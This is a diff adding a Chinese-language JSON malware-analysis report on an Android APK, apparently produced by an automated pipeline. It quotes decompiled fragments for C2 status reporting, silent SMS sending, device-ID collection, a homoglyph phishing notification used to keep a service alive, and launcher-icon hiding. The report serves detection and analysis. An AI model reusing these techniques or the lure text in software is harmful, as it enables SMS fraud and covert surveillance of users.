@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "b5a7683172d38220c4d179c525b9dd8ffaa28b6b5cb9c1b45bac7a72327b7da6.apk",
+    "sha256": "b5a7683172d38220c4d179c525b9dd8ffaa28b6b5cb9c1b45bac7a72327b7da6",
+    "包名": "org.football.enemy",
+    "应用名": "Послaниe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 309.6
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\football\\enemy\\CoastAssume;",
+          "method_signature": "a(Context context, Intent intent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "new b(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class CoastAssume extends BroadcastReceiver {\n      private void a(Context context, Intent intent) {\n>>>         new b(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();\n      }\n  \n      private Object[] a(Bundle bundle) {",
+          "behavior_description": "该类是一个BroadcastReceiver，方法a在收到广播回调（结合getResultCode()判断，很可能是短信发送状态回调SMS_SENT/SMS_DELIVERED）时，将Intent中携带的id、command、post参数以及短信发送结果码组装为键值对，通过内部类b（HTTP请求构建器，模式3）以POST方式静默上报到远程C2服务器，向攻击者回传短信指令的执行状态，构成C2远程控制的回传通道。结合厂商报告（伪装为'信息'应用、滥用AccessibilityService的短信类恶意软件），这是其C2通信/指令执行状态回传的关键环节。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\football\\enemy\\d;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "try {\n    ConvictEconomics.a(true);\n    SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n} catch (Exception e) {\n}",
+          "malicious_code_snippet_context": "      }\n  \n      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             ConvictEconomics.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n      }\n  \n      public static void a(Context context, boolean z) {",
+          "behavior_description": "该方法封装了静默发送短信的功能：接收目标号码(str)、短信内容(str2)和发送回调 PendingIntent 作为参数，直接调用 SmsManager.getDefault().sendTextMessage() 在无任何用户界面和用户确认的情况下后台发送短信。发送前调用 ConvictEconomics.a(true) 设置标志位（可能用于标记短信发送状态或规避检测），并用空的 try-catch 静默吞掉所有异常以避免崩溃暴露行为。结合厂商报告（该样本伪装成'信息'应用并滥用 AccessibilityService 隐蔽运行）及混淆类名 org.football.enemy.d，该静默发短信能力典型用于订阅扣费短信（premium SMS）欺诈或向指定号码发送诈骗/垃圾短信，直接造成用户话费损失。数据流向：外部传入/C2 控制的目标号码与短信内容(str, str2) → SmsManager.sendTextMessage() 静默发送。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\football\\enemy\\d;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 10302) {",
+          "behavior_description": "方法 c(Context) 通过 Settings.Secure.getString() 从系统安全设置数据库中读取 ANDROID_ID（64位持久性设备唯一标识符），用于构建设备指纹以标识和追踪受感染设备。数据流向：系统 Settings.Secure 设置数据库（source）→ 将 ANDROID_ID 字符串返回给上层调用方（sink），在已确认的间谍软件样本中通常被用于设备指纹标识并可能随其他窃取数据上报至C2服务器进行受害者追踪。该代码位于混淆包名 org.football.enemy 下，属于恶意样本的设备指纹采集环节；但 ANDROID_ID 单项采集的敏感度低于 IMEI/IMSI/位置信息，且本片段中未见直接的网络外传操作，故综合判定为灰色行为、中等风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\football\\enemy\\Maid;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    createNotificationChannel(new NotificationChannel(\"org.football.enemy.BOOK\", \"Retreat\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"org.football.enemy.BOOK\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(android.R.drawable.ic_dialog_info)\n    .setContentTitle(\"Cиcтемный прoцесc\")\n    .setContentText(\"Сиcтeма не корректно работaeт, вам необхoдимo включить доcтуп к стaтистикe для 'Cиcтемный прoцесc'\");\nstartForeground(1619, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() throws IllegalAccessException, InvocationTargetException {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"org.football.enemy.BOOK\", \"Retreat\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"org.football.enemy.BOOK\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Cиcтемный прoцесc\").setContentText(\"Сиcтeма не корректно работaeт, вам необхoдимo включить доcтуп к стaтистикe для 'Cиcтемный прoцесc'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(1619, builder.build());\n>>>     }\n>>> \n      private void b() {\n          this.a.cancel(1619);\n      }",
+          "behavior_description": "该代码位于恶意Service（org.football.enemy.Maid）中，通过 startForeground() 将恶意服务提升为前台服务实现进程保活，防止系统回收。其构建的通知伪装成系统进程：标题为俄语'Cиcтемный прoцесc'（系统进程），且混用西里尔字母与拉丁字母的同形字（homoglyph）规避安全检测；通知正文为社会工程话术，谎称'系统运行异常，需为系统进程开启统计信息访问权限'，实为诱导用户授予无障碍等敏感权限。数据流向：硬编码的伪装系统通知文本（含同形字混淆的俄语钓鱼话术）→ startForeground() 前台保活，使依赖 AccessibilityService 的间谍模块得以持续驻留运行，与厂商报告中该样本伪装成'Сообщениe（信息）'并利用无障碍服务隐藏自身窃密的行为完全吻合。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\football\\enemy\\Primary;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Primary.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class Primary extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Primary.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该Activity在onCreate()中调用a()后立即finish()。a()通过PackageManager.setComponentEnabledSetting()将自身启动器组件（Primary，即应用入口Activity）设置为COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面启动器中消失，实现恶意软件自我隐藏，规避用户察觉和卸载，为后续利用AccessibilityService进行隐蔽监控窃取（如厂商报告所述）创造条件。数据流向：应用自身组件信息（getApplicationContext() + Primary.class）→ setComponentEnabledSetting() 禁用启动器组件导致图标隐藏。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
